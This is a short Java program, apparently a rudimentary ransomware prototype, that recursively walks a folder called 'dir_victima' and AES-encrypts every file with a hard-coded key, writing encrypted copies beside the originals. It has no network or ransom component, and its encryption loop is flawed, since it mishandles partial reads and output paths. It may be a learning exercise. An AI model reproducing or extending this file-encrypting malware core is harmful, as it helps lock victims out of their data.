package main;

import java.io.File;
import java.io.FileInputStream;
import java.io.FileOutputStream;
import java.io.IOException;
import java.security.InvalidKeyException;
import java.security.NoSuchAlgorithmException;

import javax.crypto.BadPaddingException;
import javax.crypto.Cipher;
import javax.crypto.IllegalBlockSizeException;
import javax.crypto.NoSuchPaddingException;
import javax.crypto.SecretKey;
import javax.crypto.spec.SecretKeySpec;

public class Main {
	
	private static Cipher cipher;
	private static String victimDir = "dir_victima";
	
	public static void main(String args[]){
		try {
			String algorithm = "AES";
			byte[] key = new byte[]{1, 2, 3, 4, 5, 6, 7, 8, 9, 1, 2, 3, 4, 5, 6, 7};
			SecretKey secretKey = new SecretKeySpec(key, algorithm);
			cipher = Cipher.getInstance(algorithm);
			int mode = Cipher.ENCRYPT_MODE;
			cipher.init(mode, secretKey);
			
			encrypts(new File(victimDir));
		} catch (NoSuchAlgorithmException | NoSuchPaddingException | InvalidKeyException e) {
			e.printStackTrace();
		}
	}
	
	/**
	 * This method encrypts a directory and all subdirectories and files.
	 * @param file
	 */
	private static void encrypts(File file){
		if(file.isDirectory()) {
			File files[] = file.listFiles();
			for(File a : files){
				encrypts(a);
			}
		} else {
			try {
				System.out.println(file.getName());
				FileInputStream fis = new FileInputStream(file);
				int readBytes;
				FileOutputStream fos = new FileOutputStream(new File(victimDir + "/" + file.getName() + "_"));
				do {
					byte[] bytes = new byte[512];
					readBytes = fis.read(bytes);
					byte[] cipheredBytes = cipher.doFinal(bytes);
					fos.write(cipheredBytes);
				} while(readBytes > 0);
				fis.close();
				fos.close();
			} catch (IOException e) {
				e.printStackTrace();
			} catch (IllegalBlockSizeException e) {
				e.printStackTrace();
			} catch (BadPaddingException e) {
				e.printStackTrace();
			}
		}
	}
}
